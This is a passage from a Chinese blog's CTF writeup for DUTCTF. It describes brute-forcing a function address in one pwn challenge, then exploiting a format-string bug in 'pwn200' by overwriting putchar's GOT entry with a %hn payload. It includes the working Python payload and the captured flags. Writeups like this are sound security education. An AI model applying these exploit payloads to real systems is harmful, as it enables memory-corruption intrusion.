<p>因为本机编译的binary里<code>getflag()</code>函数的地址是<code>0x08048505</code>，于是先尝试爆破<code>0x080485**</code>，最后没有成功，接着翻了一下其他比赛的writeup，发现有时候地址是<code>0x080484**</code>，于是再次尝试，最后成功爆破。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Closed connection to 210.30.100.91 port 3858</span><br><span class="line">212</span><br><span class="line">[+] Opening connection to 210.30.100.91 on port 3858: Done</span><br><span class="line">aaaaaaaaaaaaaaaՄ\x0\x15Ei\xb7\xb0i\xb3\xbf(j\xb3\xbfF\xbeg\xb7 \x85\x0</span><br><span class="line">FLAG: DUTCTF&#123;M3n9 ch0n9 Dj,1 2hi b40 y0u.&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="谈笑风生-200Pts"><a href="#谈笑风生-200Pts" class="headerlink" title="谈笑风生 200Pts"></a>谈笑风生 200Pts</h3><p>“DUTSEC那个DJ 水平不知道比你们高到哪里去了，我和他谈笑风生” 快来和DJ谈笑风生<br>nc 210.30.100.91 3866<br><a href="http://dl.dutsec.cn/pwn/pwn200/pwn200" target="_blank" rel="noopener">http://dl.dutsec.cn/pwn/pwn200/pwn200</a></p>
<p>IDA看了下，很明显的一个格式化字符串漏洞<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxw1b4itp4j30fp0f7mxc.jpg" alt="pwn200-1"></p>
<p>只有<code>main()</code>和<code>showflag()</code>两个函数，<code>main()</code>在栈里开了块内存，将argv[1]复制过去再用<code>printf()</code>输出，而最后还诡异地调用了一下<code>putchar()</code>。那么思路很明显了，用got表挟持<code>putchar()</code>函数，使对其的调用跳去<code>showflag()</code>的地址。具体的做法是将<code>putchar()</code>的got表地址放在argv[1]的前4字节，而后面则用%n来覆盖这个地址指向的内存，实现挟持。</p>
<p><code>putchar()</code>的got地址<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxw1b8jryyj30n203s745.jpg" alt="pwn200-2"></p>
<p>最终本地测试payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#pwn200.py</span><br><span class="line">print &apos;\x24\xA0\x04\x08%34089c%7$hn&apos;</span><br></pre></td></tr></table></figure>
<p><code>./pwn200 $(python pwn200.py)</code></p>
<p>最后这题服务端那边部署有点问题nc连上去之后直接返回 <code>usage ./xxx xxxx</code> 然后断掉，没办法发送payload，然后命题人要求提交本地通过的payload人工审核，审核过了把flag发了过来<br><code>DUTCTF{DJ_IS_EVERYWHERE_666}</code></p>
</div><div class="tags"><a href="/tags/Writeup/">Writeup</a></div><div class="post-nav"><a class="pre" href="/2016/01/03/WebLogicPasswordDecryptor-GUI/">WebLogic密码解密工具</a><a class="next" href="/2015/04/15/dutctf-writeup/">DUTCTF热身赛Writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://www.imbeee.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Homelab/" style="font-size: 15px;">Homelab</a> <a href="/tags/Pentest/" style="font-size: 15px;">Pentest</a> <a href="/tags/Tool/" style="font-size: 15px;">Tool</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://imbeee.github.io/" title="Github Pages备份" target="_blank">Github Pages备份</a><ul></ul><a href="https://ymr.me/" title="野蛮人の洞窟" target="_blank">野蛮人の洞窟</a><ul></ul><a href="http://bksec.net/" title="my5t3ry的blog" target="_blank">my5t3ry的blog</a><ul></ul><a href="https://www.blackh4t.org/" title="DarkRay's BLoG.!" target="_blank">DarkRay's BLoG.!</a><ul></ul><a href="https://www.iswin.org/" title="随风's Blog" target="_blank">随风's Blog</a><ul></ul><a href="http://www.00theway.org/" title="00theway's Blog" target="_blank">00theway's Blog</a><ul></ul><a href="https://threathunter.org/" title="ThreatHunter社区" target="_blank">ThreatHunter社区</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Beeeの零碎事.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>